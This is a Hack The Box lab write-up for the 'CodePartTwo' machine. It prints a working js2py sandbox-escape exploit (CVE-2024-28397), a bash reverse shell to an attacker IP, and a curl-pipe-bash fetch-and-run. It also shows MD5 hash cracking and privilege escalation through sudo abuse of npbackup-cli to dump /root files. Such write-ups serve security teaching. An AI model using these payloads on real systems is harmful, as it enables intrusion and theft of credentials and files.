# HTB Write-Up: CodePartTwo

| Field | Details |
| --- | --- |
| Platform | [Hack The Box](https://app.hackthebox.com/machines/CodePartTwo) |
| Difficulty | Easy |
| OS | Linux |
| Date | October 28, 2026 |

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Initial Access — js2py Sandbox Escape RCE (CVE-2024-28397)](#initial-access-js2py-sandbox-escape-rce-cve-2024-28397)
3. [Lateral Movement — SQLite Credential Dump & Hash Cracking](#lateral-movement-sqlite-credential-dump-hash-cracking)
4. [Privilege Escalation — npbackup-cli Sudo Abuse](#privilege-escalation-npbackup-cli-sudo-abuse)

## Reconnaissance

Port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.232.59 --ulimit=5000
```

**Open Ports:**

| Port | Service |
| --- | --- |
| 22 | SSH |
| 8000 | HTTP |

Browsing to the web app on port 8000 showed a login/register page for a code-execution dashboard, with a "download app" link on the home page — a strong hint the source itself is meant to be reviewed.

## Initial Access — js2py Sandbox Escape RCE (CVE-2024-28397)

### 2.1 — Registering and Reviewing the Source

An account was registered (`farid:farid`), revealing a dashboard for writing and running Python code server-side. The downloadable app bundle was pulled and inspected:

```bash
cd app
cat app.py
cat requirements.txt
```

```
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

### 2.2 — Identifying the Vulnerable Library

**js2py 0.74** is vulnerable to a sandbox-escape RCE, **CVE-2024-28397**: a public PoC ([Marven11/CVE-2024-28397-js2py-Sandbox-Escape](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)) walks the JS object prototype chain up to Python's own base object class, then hunts through its subclasses for `subprocess.Popen` — turning what looks like sandboxed JavaScript into direct OS command execution.

### 2.3 — Staging a Reverse Shell

```bash
cat > rev.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.25/4444 0>&1
EOF
python3 -m http.server 9000
```

A listener was opened on a separate terminal:

```bash
nc -nvlp 4444
```

### 2.4 — Triggering the Exploit

The PoC's object-chain walk was submitted to the dashboard's code-execution endpoint, with the command set to pull and run the staged script:

```javascript
let cmd = "curl http://10.10.14.25:9000/rev.sh |bash"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

Running this returned a shell to the listener:

```
connect to [10.10.14.25] from (UNKNOWN) [10.129.232.59] 43338
app@codeparttwo:~/app$
```

### 2.5 — Stabilizing the Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
reset
```

## Lateral Movement — SQLite Credential Dump & Hash Cracking

### 3.1 — Finding the Database

`app.py` defined a SQLAlchemy `User` model backed by a SQLite file (`users.db`). It was located and opened:

```bash
find / -type f -name users.db 2>/dev/null
sqlite3 /home/app/app/instance/users.db
```

```sql
.tables
SELECT * FROM user;
```

```
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

### 3.2 — Cracking marco's Hash

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

**Result:**

```
sweetangelbabylove (?)
```

### 3.3 — Switching User & User Flag

```bash
su marco
# Password: sweetangelbabylove
cat user.txt
a6a68d95c51901c15e1b1fb3afa0a462
```

### 3.4 — A Clue for Later

`marco`'s home directory held **`npbackup.conf`**, a config file for the **npbackup-cli** backup tool, with an encrypted repo password and a backup path hardcoded to `/home/app/app/` — worth remembering once privilege escalation came into view.

## Privilege Escalation — npbackup-cli Sudo Abuse

### 4.1 — Checking Sudo Rights

```bash
sudo -l
```

```
User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

`marco` can run the backup tool as **any user, with no password**. The original config (`npbackup.conf`) backs up `/home/app/app/`, which isn't directly useful — but a backup tool that accepts a config path on the command line is a backup tool that can be pointed anywhere.

### 4.2 — Redirecting the Backup Target

The original config file couldn't be edited in place, so a copy was made and the backup path changed to `/root`:

```bash
cp npbackup.conf npbackup1.conf
# edit npbackup1.conf: paths: - /root
```

### 4.3 — Running the Backup as Root

```bash
sudo /usr/local/bin/npbackup-cli -c npbackup1.conf -b -f
```

```
INFO :: npbackup ... running as root
INFO :: Running backup of ['/root'] to repo default
snapshot bc237337 saved
```

The backup itself reported a size error (too small to count as a valid backup by the tool's own threshold), but the snapshot was created regardless.

### 4.4 — Reading the Snapshot

The snapshot's contents were listed directly:

```bash
sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --ls
```

```
/root/root.txt
/root/.ssh/id_rsa
...
```

`root.txt` was confirmed present in the snapshot — and npbackup-cli can dump an individual file straight out of it without needing a full restore:

```bash
sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --dump /root/root.txt
```

```
a1f8054c081e9826e98e9dbb985dd695
```
